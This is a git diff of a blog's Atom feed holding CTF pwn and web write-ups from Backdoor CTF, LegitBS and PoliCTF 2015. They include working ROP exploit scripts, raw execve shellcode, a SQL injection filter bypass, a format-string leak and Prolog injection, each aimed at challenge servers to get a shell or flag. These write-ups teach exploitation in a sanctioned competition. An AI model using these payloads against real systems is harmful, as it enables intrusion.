@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
   <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://barrebas.github.io/"/>
-  <updated>2015-06-28T19:53:34+02:00</updated>
+  <updated>2015-07-12T17:25:36+02:00</updated>
   <id>http://barrebas.github.io/</id>
   <author>
     <name><![CDATA[barrebas]]></name>
@@ -14,394 +14,106 @@
 
   
   <entry>
-    <title type="html"><![CDATA[LegitBS CTF - R0pbaby]]></title>
-    <link href="http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby/"/>
-    <updated>2015-05-29T23:07:23+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/05/29/legitbs-ctf-r0pbaby</id>
-    <content type="html"><![CDATA[<p>I&rsquo;ve been away for quite a while, and I missed most of the LegitBS CTF. There were only a few hours left when I joined Swappage. Here&rsquo;s how we solved r0pbaby.</p>
+    <title type="html"><![CDATA[PoliCTF 2015 - John's Shuffle]]></title>
+    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle/"/>
+    <updated>2015-07-12T17:06:29+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-shuffle</id>
+    <content type="html"><![CDATA[<p>John&rsquo;s Shuffle was a 350 point pwnable for PoliCTF 2015. Here&rsquo;s how I cracked it!</p>
 
 <!--more-->
 
 
-<p>So we&rsquo;re given a binary and a place to connect to. Upon running and examing the binary, it seems like this is a very easy ROP challenge. The binary will give libc function addresses upon request; this makes it easy to defeat ASLR. The option of getting libc&rsquo;s base address seems to return some strange address. Finally, the third option asks for a buffer, which is then copied to the stack, overwrites the saved return address and basically kicks off our ROP chain&hellip; couldn&rsquo;t be easier, right?</p>
+<p>Again, it&rsquo;s a 32 bit ELF binary. Running it yields the following:</p>
 
-<pre><code class="bash">bas@tritonal:~/tmp/ropbaby$ file r0pbaby
-r0pbaby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
-bas@tritonal:~/tmp/ropbaby$ gdb ./r0pbaby 
-gdb-peda$ checksec
-CANARY    : disabled
-FORTIFY   : ENABLED
-NX        : ENABLED
-PIE       : ENABLED
-RELRO     : disabled
+<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-shuffle$ ./johns-shuffle 
+It all began as a mistake..
+
+
+It all began as a mistake..
+
+
+It all began as a mistake..
 </code></pre>
 
-<p>So exploiting it should be relatively easy. The binary itself contains very little useable gadgets. We can defeat ASLR by leaking function addresses. There is, however, the problem of finding the correct libc <em>version</em>. This took us some time to figure out, but luckily Swappage found an <a href="https://github.com/niklasb/libc-database">offline tool to identify libc</a>. It was <code>libc6_2.19-0ubuntu6.6_i386</code>. Another nice tool to identify libc is <a href="http://libcdb.com">libcdb.com</a>. After identifying the right libc version, we could find all the necessary gadgets via <a href="http://ropshell.com">ropshell.com</a>. Our plan was to <code>mprotect()</code> a certain region of memory as RWX, then <code>read()</code> in some shellcode and return to it.</p>
+<p>Not very useful. The disassembly provided some hints, for it had functions like <code>shuffle</code>, <code>unshuffle</code> and <code>bubblesort</code>. The program kicks off by clearing a lot of stack space and calling <code>unshuffle</code>. Then, it asks for user input, maximum size 0x44 bytes. I decided to enter 0x44 * <code>A</code> (what else?).</p>
 
-<p>Now, the plan fell through. For some reason, the <code>read()</code> syscall to read in the shellcode failed. Instead, I switched the exploit around a bit. We have access to <code>system()</code>, so I set up a ROP chain to <code>mprotect()</code> the first 0x1000 bytes of libc as RWX. Then, I wrote out the string <code>/bin//sh</code> to memory. At this point, it was getting late and I could have just as easily written out <code>/bin/sh,0</code> to memory&hellip; Finally, returning to <code>system("/bin//sh")</code> spawned a shell, allowing us to read the flag!</p>
-
-<pre><code class="python">import socket, struct, re, time
-
-def p(x):
-    return struct.pack('&lt;Q', x)
-
-def get_function(s, name):
-    s.send('2\n')
-    s.send(name+'\n')
-    time.sleep(0.50)
-    data = s.recv(1000)
-
-    m = re.findall('(0x0000.*)', data)
-    print m
-    return int(m[0], 16)
-
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#s.connect(('localhost', 4000))
-s.connect(('r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me', 10436))
-
-print s.recv(1000)
-print s.recv(1000)
-
-# get some address where we'll store the shellcode
-SYSTEM = get_function(s, "system")
-READ = get_function(s, "read")
-MPROTECT = get_function(s, "mprotect")
-
-# this offset was found like so:
-# $ nm -D ./libc-2.19.so |grep mprotect
-# 00000000000f4a20 W mprotect
-LIBC_BASE = MPROTECT - 0xf4a20
-
-print "[!] libc_base  = 0x%X" % LIBC_BASE
-print "[!] system()   = 0x%X" % SYSTEM
-print "[!] read()     = 0x%X" % READ
-print "[!] mprotect() = 0x%X" % MPROTECT
-
-POPRDX = LIBC_BASE + 0x000bcee0
-POPRAX = LIBC_BASE + 0x00048858
-POPRSI = LIBC_BASE + 0x00024805
-POPRDI = LIBC_BASE + 0x00022b1a
-SYSCAL = LIBC_BASE + 0x000c1e55
-MOVMEM = LIBC_BASE + 0x0002fa03 #: mov [rax], rdx; ret
-
-# kick off ROP chain
-s.send('3\n')
-print s.recv(1000)
-
-
-# build ROP chain
-# first, mprotect() a certain area
-payload = "A"*8
-payload += p(POPRDX)
-payload += p(7)
-payload += p(POPRSI)
-payload += p(0x1000)
-payload += p(POPRDI)
-payload += p(LIBC_BASE)
-payload += p(POPRAX)
-payload += p(10)
-payload += p(SYSCAL)
-
-# secondly, write '/bin' to memory via MOVMEM gadget
-payload += p(POPRDX)
-payload += p(0x6e69622f)
-payload += p(POPRAX)
-payload += p(LIBC_BASE)
-payload += p(MOVMEM)
-
-# thirdly, write '//sh' to memory
-payload += p(POPRDX)
-payload += p(0x68732f2f)
-payload += p(POPRAX)
-payload += p(LIBC_BASE+4)
-payload += p(MOVMEM)
-
-# finally, return-to-system and invoke a shell
-payload += p(POPRDI)
-payload += p(LIBC_BASE)
-payload += p(SYSTEM)
-
-length = "%d" % (len(payload)+1)
-print "[!] sending " + length + " bytes"
-s.send(length + '\n')
-
-time.sleep(0.5)
-s.send(payload + '\n')
-
-print s.recv(1000)
-
-# interact with the shell
-import telnetlib
-t = telnetlib.Telnet()
-t.sock = s
-t.interact()
-s.close()
+<pre><code>    ... clear stack space ...
+ 8048f30: call   8048df0 &lt;unshuffle&gt;
+ 8048f35: mov    DWORD PTR [esp],0x804b078
+ 8048f3c: call   8048710 &lt;puts@plt&gt;
+ 8048f41: mov    eax,ds:0x804b0c0
+ 8048f46: mov    DWORD PTR [esp],eax
+ 8048f49: call   80486c0 &lt;fflush@plt&gt;
+ 8048f4e: mov    eax,ds:0x804b0a0
+ 8048f53: mov    DWORD PTR [esp+0x8],eax
+ 8048f57: mov    DWORD PTR [esp+0x4],0x44
+ 8048f5f: lea    eax,[esp+0x2c]
+ 8048f63: mov    DWORD PTR [esp],eax
+ 8048f66: call   80486e0 &lt;fgets@plt&gt;
 </code></pre>
 
-<p>Putting it all together:</p>
+<p>When runnning the <code>shuffle</code> function, the program executes <code>system()</code>, which spawns <code>/bin/dash</code> on my system, effectively stopping me from debugging it in <code>gdb</code>. I patched system in gdb so it would return immediately and I could trace the program. Turns out <code>shuffle</code> takes the GOT entries, all the function pointers, and shuffles them around. <code>unshuffle</code> negates this operation. After the second time I entered 0x44 A&rsquo;s, the program crashed with control over EIP and EBP:</p>
 
-<p><img src="/assets/legitbs/r0pbaby.png" alt="" /></p>
+<pre><code>gdb-peda$ start
+Temporary breakpoint 2, 0x08048ec2 in main ()
+gdb-peda$ p system
+$2 = {&lt;text variable, no debug info&gt;} 0xf7e9ac30 &lt;system&gt;
+gdb-peda$ set *0xf7e9ac30=0xc3
+gdb-peda$ c
+It all began as a mistake..
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
-<p>This was an easy one, but still took me a while to get back into binary exploitation. Especially getting the correct libc version took longer than necessary and my thanks go out to Swappage for persisting and finding the correct version!</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Backdoor CTF - Judge]]></title>
-    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge/"/>
-    <updated>2015-04-02T20:10:52+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge</id>
-    <content type="html"><![CDATA[<p>A web challenge! For 100 points, we we&rsquo;re asked to log in as <code>admin</code>.</p>
+It all began as a mistake..
 
-<!-- more -->
+It all began as a mistake..
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
-
-<p>Pointing a browser to the challenge site gave us the option to login, or register. I decided to register <code>testz0r:testz0r</code> and logged in. The login then asked me to login as admin. Well, I had no password for admin. I went back to the register page, thinking there was a SQLi there. That might allow me to inject into the INSERT INTO statement and update the admin&rsquo;s password. Alas, no dice.</p>
-
-<p>I again fired up <code>curl</code> and tried to get some SQLi going on the login form.</p>
-
-<pre><code class="bash">curl http://hack.bckdr.in/JUDGE/index.php --data "username=testz0r' or 'a'='a&amp;password=testz0r"
-&lt;!DOCTYPE html&gt;
-
-&lt;html&gt;
-
-&lt;head&gt;
-&lt;title&gt;Login&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body&gt;
-An Error occured
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0xf7fbeff4 --&gt; 0x15fd7c 
+ECX: 0x4 
+EDX: 0x80487a6 (&lt;difftime@plt+6&gt;:   push   0x88)
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0x41414141 ('AAAA')
+ESP: 0xffffd5c0 ('A' &lt;repeats 31 times&gt;)
+EIP: 0x41414141 ('AAAA')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414141
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd5c0 ('A' &lt;repeats 31 times&gt;)
+0004| 0xffffd5c4 ('A' &lt;repeats 27 times&gt;)
+0008| 0xffffd5c8 ('A' &lt;repeats 23 times&gt;)
+0012| 0xffffd5cc ('A' &lt;repeats 19 times&gt;)
+0016| 0xffffd5d0 ('A' &lt;repeats 15 times&gt;)
+0020| 0xffffd5d4 ('A' &lt;repeats 11 times&gt;)
+0024| 0xffffd5d8 ("AAAAAAA")
+0028| 0xffffd5dc --&gt; 0x414141 ('AAA')
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+gdb-peda$ 
 </code></pre>
 
-<p>After messing around for a while, I remembered that sometimes, keywords like <code>OR</code> and <code>AND</code> are filtered. I tried to substitute <code>OR</code> for <code>||</code> and whadda-ya-know:</p>
+<p>Cool, easy control over EIP. However, at this point, we cannot rely on the GOT entries, because they are still shuffled! We can&rsquo;t just ret2system. I spent some time trying to return to <code>unshuffle</code>, but kept losing control of the program execution.</p>
 
-<pre><code class="bash">$ curl http://hack.bckdr.in/JUDGE/index.php --data "username=admin'||'1&amp;password=testz0r"
-&lt;!DOCTYPE html&gt;
+<p>But let&rsquo;s take a step back here. Linux ELF binaries employ something called &ldquo;lazy linking&rdquo;. When a binary is started, the symbols are not resolved yet. Only when a function is called for the first time will the function address be resolved. The GOT entry will be pointing to this look up code (memcpy as example):</p>
 
-&lt;html&gt;
-
-&lt;head&gt;
-&lt;title&gt;Login&lt;/title&gt;
-&lt;/head&gt;
-
-&lt;body&gt;
-Flag is [REDACTED]
+<pre><code>080486d0 &lt;memcpy@plt&gt;:
+ 80486d0:   ff 25 1c b0 04 08       jmp    DWORD PTR ds:0x804b01c 
+ 80486d6:   68 20 00 00 00          push   0x20
+ 80486db:   e9 a0 ff ff ff          jmp    8048680 &lt;_init+0x2c&gt;
 </code></pre>
 
-<p>Done! One filter bypass was all it took.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Backdoor CTF - LHC]]></title>
-    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-lhc/"/>
-    <updated>2015-04-02T19:59:55+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-lhc</id>
-    <content type="html"><![CDATA[<p><code>LHC</code> was a short &amp; sweet challenge in Backdoor CTF. It had a nice &lsquo;aha-Erlebnis&rsquo; moment.</p>
+<p>When called for the first time, <code>0x804b01c</code> will be pointing to <code>0x80486d6</code>, which will kick off the function resolver. So instead of using <code>0x80486d0</code> to do a memcpy, I&rsquo;d just use <code>0x80486d6</code>. This bypasses the mess that <code>shuffle</code> made!</p>
 
-<!-- more -->
-
-
-<p>During the CTF, the organizers dropped this challenge. The description mentioned that the flag was hidden in a data file. This data file was kindly provided by the Large Hadron Collider and was 2049 GB large.</p>
-
-<p>I&rsquo;ll let that sink in.</p>
-
-<p>Two-thousand and forty nine <strong>gigabytes</strong>. Downloading it would take more than twenty days. The flag was in the middle of the file, but that still meant downloading more than a terabyte of data.</p>
-
-<p>I fired up <code>curl</code> and looked at the download:</p>
-
-<pre><code>bas@tritonal:~/tmp/bckdr/medusa$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt &gt; /dev/null
-* About to connect() to lhc-cdn.herokuapp.com port 443 (#0)
-*   Trying 107.21.223.88...
-...snip...
-&gt; GET /data.txt HTTP/1.1
-&gt; User-Agent: curl/7.26.0
-&gt; Host: lhc-cdn.herokuapp.com
-&gt; Accept: */*
-&gt; 
-* additional stuff not fine transfer.c:1037: 0 0
-* HTTP 1.1 or later with persistent connection, pipelining supported
-&lt; HTTP/1.1 200 OK
-&lt; Server: Cowboy
-&lt; Connection: keep-alive
-&lt; X-Powered-By: Express
-&lt; Accept-Ranges: bytes
-&lt; Content-Type: text/plain; charset=utf-8
-&lt; Content-Length: 2200000000000
-&lt; Date: Wed, 01 Apr 2015 21:44:48 GMT
-&lt; Via: 1.1 vegur
-</code></pre>
-
-<p>Yup, 2200000000000 bytes of data. But wait! <code>curl</code> has the option to resume a broken download; that meant that I could control where the download would start. I issued this command and started searching the output for the flag:</p>
-
-<pre><code class="bash">$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt -C 1100000000000 &gt; lhc-middle
-...snip...
-$ strings -n 20 ./lhc-middle
-</code></pre>
-
-<p>This gave me part of the flag; the description said it was in the middle of the datafile, so I subtracted another 1000 bytes:</p>
-
-<pre><code>$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt -C 1099999998999 &gt; lhc-middle
-$ strings lhc-middle -n 20
-              The flag is: [REDACTED]
-</code></pre>
-
-<p>Simple, really, once you know the trick.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Backdoor CTF - QR]]></title>
-    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr/"/>
-    <updated>2015-04-02T19:43:08+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr</id>
-    <content type="html"><![CDATA[<p>For this challenge, we had to decode a ton of QR images given to us via a <code>nc</code> connection for 70 points. Sounds like fun!</p>
-
-<!-- more -->
-
-
-<p>Upon connecting to the service, it tells us we need to decode as much flags as we can. We also get the first flag.</p>
-
-<p><img src="/assets/bckdr/qr-00.png" alt="" />
-Right, so I turned to the solution to <a href="https://ctf-team.vulnhub.com/advent-ctf-2014-qr-garden/">QR Garden by Swappage</a>. I liked his approach and decided to do something similar. I installed <code>zbar</code> on my box and cobbled together a python script. That script would connect to the QR service, write out the QR code to disk using <code>PIL</code> and then call <code>zbarimg</code> to decode the QR code. I had some issues at the start because I mixed up the colors of the QR code, but then I was decoding them all pretty rapidly.</p>
+<p>With all this in hand, I wrote an exploit and the corresponding rop chain (well&hellip; more like ret2resolve ;)).</p>
 
 <pre><code class="python">from socket import *
-from PIL import Image
-from os import popen
-import re, time, telnetlib
-
-def readtil(delim):
-    buf = b''
-    while not delim in buf:
-        buf += s.recv(1)
-    return buf
-
-def sendln(b):
-    s.send(b + b'\n')
-
-def getQR(qr):
-    im = Image.new("RGB", (94, 94), 'white')
-
-    pixels = im.load()
-    print len(qr)
-    y = 0
-    x = 0
-    i = 0
-    while i &lt; len(qr):
-        if ord(qr[i]) == 0xe2:
-            pixels[x,y] = (0, 0, 0)
-            pixels[x,y+1] = (0, 0, 0)
-            x += 1
-        if ord(qr[i]) == 0x20:
-            pixels[x,y] = (255, 255, 255)
-            pixels[x,y+1] = (255, 255, 255)
-            x += 1
-        if ord(qr[i]) == 0xa:
-            x = 0
-            y += 2
-        i += 1
-
-    # write out QR to disk  
-    im.save('qr.png')
-
-    # ugly hack because ctf
-    popen('zbarimg ./qr.png &gt; qr.out')
-
-    with open('qr.out') as f:
-        data = f.readline()
-        f.close()
-
-    m = re.findall(r'Code:([0-9a-f]*)', data)
-    return m[0]
-
-def pwn():
-    global s
-    s = socket(AF_INET, SOCK_STREAM)
-    s.connect(("hack.bckdr.in", 8010))
-
-    readtil('can') # banner
-
-    try:
-        while 1:
-            time.sleep(0.05)
-            qr = readtil(b'\x0a                                          ')
-            #print qr
-            sendln(getQR(qr))
-            response = s.recv(200)
-            print response
-    except KeyboardInterrupt:
-        t = telnetlib.Telnet()
-        t.sock = s
-        t.interact()
-        s.close()
-
-pwn()
-</code></pre>
-
-<p>The script was receiving and decoding QR codes quite rapidly, but I didn&rsquo;t receive any flags. I finally just fired up <code>wireshark</code> to grab the flag from the TCP stream:</p>
-
-<p><img src="/assets/bckdr/qr-01.png" alt="" /></p>
-
-<p>Not the most elegant way to grab the flag, but hey, it worked.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Backdoor CTF - Team]]></title>
-    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team/"/>
-    <updated>2015-04-02T19:23:27+02:00</updated>
-    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team</id>
-    <content type="html"><![CDATA[<p>Backdoor CTF was hosted on a weekday, so we only had the evening to grab as many flags as we could. Here&rsquo;s how we solved <code>team</code> for 600 points.</p>
-
-<!-- more -->
-
-
-<p>The binary we&rsquo;ve been given is a 32-bit ELF. The output of strings doesn&rsquo;t give us much. Using <code>strace ./team</code>, it becomes clear that the binary reads from <code>flag.txt</code> so I created one locally. I echoed <code>flag1</code> to the file and restarted the binary.</p>
-
-<p>It asks for a team name and a flag. After receiving these values in heap buffers (non-overflowable as far as I could gather) it proceeds to read the flag from <code>flag.txt</code>. Then, it compares the user input to the flag using <code>strcmp</code>.</p>
-
-<p>The team name is then printed using <code>printf</code>: this is vulnerable to a format string vulnerability:</p>
-
-<pre><code>bas@tritonal:~/tmp/bckdr/team-600$ ./team
-Enter teamname: TEAM%llp
-Enter flag: FLAG%llp
-TEAM0x64 : incorrect flag. Try again.
-</code></pre>
-
-<p>Okay, so let&rsquo;s have a look at the stack when we reach <code>printf</code>. It gets called at <code>8048711</code> to print the team name.</p>
-
-<pre><code>Breakpoint 1, 0x08048711 in ?? ()
-gdb-peda$ x/40wx $esp
-0xffffd510: 0x0804b008  0x00000064  0x0804b140  0x00000000
-0xffffd520: 0x00000000  0x00000000  0x0804b0d8  0x0804b008
-0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
-0xffffd540: 0x00000000  0x00000000  0x00000000  0x00000000
-0xffffd550: 0x00000000  0x00000000  0x00000000  0x00000000
-0xffffd560: 0x00000000  0x00000000  0x00000000  0x00000000
-0xffffd570: 0x00000000  0x00000000  0x00000000  0x00000000
-0xffffd580: 0x00000000  0x00000000  0x00000000  0x00000000
-0xffffd590: 0x00000000  0x00000002  0x00000000  0x856b7a00
-0xffffd5a0: 0x00000000  0x00000000  0xffffd5d8  0x0804880c
-</code></pre>
-
-<p>What&rsquo;s this then? From breakpointing <code>strcmp</code>, I learned that the flag was on the stack. In fact, it&rsquo;s within reach of the format string vulnerability!</p>
-
-<pre><code>0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
-                          flag1 &gt;&gt;&gt;   g a l f           1
-</code></pre>
-
-<p>That&rsquo;s too easy, right? Wrong! The flag starts at <code>%10$p</code>:</p>
-
-<pre><code class="bash">bas@tritonal:~/tmp/bckdr/team-600$ ./team
-Enter teamname: %10$p
-Enter flag: bleh
-0x67616c66 : incorrect flag. Try again.
-</code></pre>
-
-<p>It worked remotely with this script:</p>
-
-<pre><code class="python">from socket import *
-import struct, telnetlib, re, sys
+import struct, telnetlib, re, sys, time
 
 def readtil(delim):
     buf = b''
@@ -418,30 +130,456 @@ def sendbin(b):
 def p(x):
     return struct.pack('&lt;L', x &amp; 0xffffffff)
 
-def pwn(n):
+def pwn():
     global s
     s=socket(AF_INET, SOCK_STREAM)
-    s.connect(('hack.bckdr.in', 8004))
+    s.connect(('shuffle.polictf.it', 80))
 
-    readtil('teamname: ')
-    sendln("AAAA%"+str(n)+"$p")
-    readtil('flag: ')
-    sendln("CTF_TEAM_VULNHUB")
-    data = readtil('again.')
+    readtil('mistake..')
+
+    rop = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    rop += p(0x8048696) # resolve -&gt; read (so we can read in `/bin/sh`)
+    rop += p(0x804901d) # pppr
+    rop += p(0)         # stdin
+    rop += p(0x804b130) # free mem area
+    rop += p(0x10)
+    rop += p(0x8048726) # resolve -&gt; system
+    rop += p(0x8048746) # resolve -&gt; exit (makes rasta_mouse happy!)
+    rop += p(0x804b130) # arg for system; will contain /bin/sh in a few moments
+
+    sendln(rop)
+
+    readtil('mistake..')
+    sendln(rop)
+    readtil('mistake..')
+    sendln(rop)
+
+    sendln('/bin/sh')
+    t = telnetlib.Telnet()
+    t.sock = s
+
+    t.interact()
 
     s.close()
-    m = re.findall(r'0x([0-9a-f]*) :', data)
-    return m[0]
 
-full = ''
-for i in xrange(10, 30):
-    full += pwn(i).decode('hex')[::-1]
-    print full
+pwn()
 </code></pre>
 
-<p>This spits out the flag until it hits something it can&rsquo;t hex decode. Because the CTF is long-lived, we won&rsquo;t post any flags.</p>
+<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-shuffle$ python poc.py 
 
-<p>Far too easy for a 600 point challenge, but we&rsquo;re not complaining&hellip;</p>
+id
+uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
+cat /home/ctf/*
+flag{rand0mizing_things_with_l0ve}
+cat: /home/ctf/johnshuffle: Permission denied
+</code></pre>
+
+<p>Easy peasy! The flag was <code>flag{rand0mizing_things_with_l0ve}</code>. Nice!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PoliCTF 2015 - John's Library]]></title>
+    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library/"/>
+    <updated>2015-07-12T16:45:04+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-johns-library</id>
+    <content type="html"><![CDATA[<p>Finally, pwnables! John&rsquo;s Library was worth 150 points. I was a bit rusty but I managed to grab this flag.</p>
+
+<!--more-->
+
+
+<p>We&rsquo;re given a 32 bit Linux ELF. Upon running it, we&rsquo;re presented with a library menu, where we can view titles, add them and exit the program:</p>
+
+<pre><code class="bash">Welcome to the jungle library mate! Try to escape!!
+
+ r - read from library
+ a - add element
+ u - exit
+a
+Hey mate! Insert how long is the book title: 
+10000
+Hey you! what are you trying to do??
+</code></pre>
+
+<p>So we can&rsquo;t really add long titles. Upon inspection, Swappage and I noticed that the titles are stored on the stack, with the lengths in a special data structure in the <code>.data</code> of the binary:</p>
+
+<pre><code> 8048731: mov    eax,DWORD PTR [eax*4+0x804a060] ; 0x804a060 contains lengths
+ 8048738: mov    edx,eax
+ 804873a: mov    eax,DWORD PTR [ebp+0x8]         ; ptr to first book
+ 804873d: add    eax,edx                         ; add length of last string to it
+ 804873f: mov    DWORD PTR [esp],eax
+ 8048742: call   8048410 &lt;gets@plt&gt;              ; grab book title
+</code></pre>
+
+<p>I noticed I could bypass the length check with a large number, effectively utilizing a signedness bug. This allowed us to overwrite the return address of <code>main()</code> on the stack. Although NX wasn&rsquo;t enabled, ASLR was enabled so we couldn&rsquo;t just jump to the shellcode on the stack. There weren&rsquo;t enough gadgets for a ROP chain. Instead, we needed to leak a stack address so we could return to the shellcode on the stack (bruteforcing it didn&rsquo;t work). That&rsquo;s where the read function came into play.</p>
+
+<p>Looking up a book title via the read function was done like this:</p>
+
+<pre><code> 8048678: mov    eax,DWORD PTR [ebp-0xc]         ; number we just submitted
+ 804867b: mov    eax,DWORD PTR [eax*4+0x804a060] ; grab length of that book title
+ 8048682: mov    edx,eax
+ 8048684: mov    eax,DWORD PTR [ebp+0x8]         ; pointer to book titles on stack
+ 8048687: add    eax,edx                         ; add length of string so eax points to book title 
+ 8048689: mov    DWORD PTR [esp+0x4],eax
+ 804868d: mov    DWORD PTR [esp],0x8048893
+ 8048694: call   80483f0 &lt;printf@plt&gt;            ; dump title to user
+</code></pre>
+
+<p>By passing in a negative number, I was able to make <code>804867b: mov eax,DWORD PTR [eax*4+0x804a060]</code> point to <code>0x80493fc</code>, which contained <code>0xffffffe0</code>. Therefore, when this value is added to the pointer to the book titles, it actually is moved backwards and starts leaking stack addresses:</p>
+
+<pre><code>0xffffd1ab (address of book titles on stack) + 0xffffffe0 =&gt; 
+gdb-peda$ x/10x $eax
+0xffffd18b: 0x048614-&gt;ff    0xffd1ab&lt;-08    0x000002ff  0x15fd7c00
+0xffffd19b: 0x15fd7c00  0x15fd7c00  0x0000f000  0x0000f000
+</code></pre>
+
+<p>I now had a way to leak the book title buffer on the stack, where we could store shellcode in a book title. By exploiting the signedness bug, we could overwrite the return address of <code>main()</code>. After setting all of this up, we&rsquo;d ask the binary to exit and make it return to our shellcode. Putting it all together:</p>
+
+<pre><code class="python">from socket import *
+import struct, telnetlib, re, sys, time
+
+def readtil(delim):
+    buf = b''
+    while not delim in buf:
+        buf += s.recv(1)
+    return buf
+
+def sendln(b):
+    s.send(b + b'\n')
+
+def sendbin(b):
+    s.sendall(b)
+
+def p(x):
+    return struct.pack('&lt;L', x &amp; 0xffffffff)
+
+def pwn():
+    global s
+    s=socket(AF_INET, SOCK_STREAM)
+    s.connect(('library.polictf.it', 80))
+
+    readtil('exit')
+
+    # mem leak
+    sendln('r')
+    readtil('read:')
+    sendln('-793')  
+    # -793*4 = 0xfffff39c; 
+    # 0x804867b &lt;read_from_library+58&gt;: mov eax,DWORD PTR [eax*4+0x804a060] 
+    # -&gt; 0x80493fc == 0xffffffe0
+
+    # leak stack addr
+    time.sleep(0.1)
+    buf = s.recv(20)
+    stackaddr = struct.unpack('&lt;L', buf[6:10])[0]
+    print hex(stackaddr+100)
+    readtil('exit')
+
+    sendln('a')
+    readtil('title:')
+    sendln('1')
+    sendln('b')
+
+    readtil('exit')
+
+    sendln('a')
+    readtil('title:')
+    # 2**32 -&gt; integer overflow, 
+    # we now have plenty of space to overwrite the saved return address
+    sendln('4294967296') 
+
+    # the reason i divided the nop sled is simple; for some reason, when the shellcode executes, 
+    # it overwrites itself if it's at the end. this solves it; didn't debug it 
+    sendln("\x90"*(0x30f-37)+"\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcc\x80"+"A"*0x100+p(stackaddr+200)) # 0xffffd1ad -&gt; start of our buffer
+
+    readtil('exit')
+    sendln('u')
+
+    t = telnetlib.Telnet()
+    t.sock = s
+
+    t.interact()
+
+    s.close()
+
+pwn()
+</code></pre>
+
+<p>And running it:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/polictf/johns-library$ python sn0w.py 
+
+id
+uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
+cd /home/ctf
+ls
+challenge
+flag
+cat flag
+flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}
+</code></pre>
+
+<p>The flag was <code>flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}</code>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PoliCTF 2015 - Hanoi as a Service]]></title>
+    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service/"/>
+    <updated>2015-07-12T16:30:31+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service</id>
+    <content type="html"><![CDATA[<p>Hanoi As A Service was a 50 point pwnable in PoliCTF and gave me a reason to hate PROLOG.</p>
+
+<!--more-->
+
+
+<p>We&rsquo;re given <code>nc haas.polictf.it 80</code> as point of attack. Let&rsquo;s start:</p>
+
+<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
+Welcome to the Hanoi-as-a-Service cloud platform!
+How many disks does your tower have?
+
+ERROR: Prolog initialisation failed:
+ERROR: Syntax error: Unexpected end of clause
+ERROR: hanoi() 
+ERROR: ** here **
+ERROR: .
+</code></pre>
+
+<p>Interesting. I now know I&rsquo;m up against some Prolog program. Let&rsquo;s see if we can inject Prolog code:</p>
+
+<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
+Welcome to the Hanoi-as-a-Service cloud platform!
+How many disks does your tower have?
+0), hanoi(2). 
+* Move top disk from a to c
+* Move top disk from a to b
+* Move top disk from c to b
+</code></pre>
+
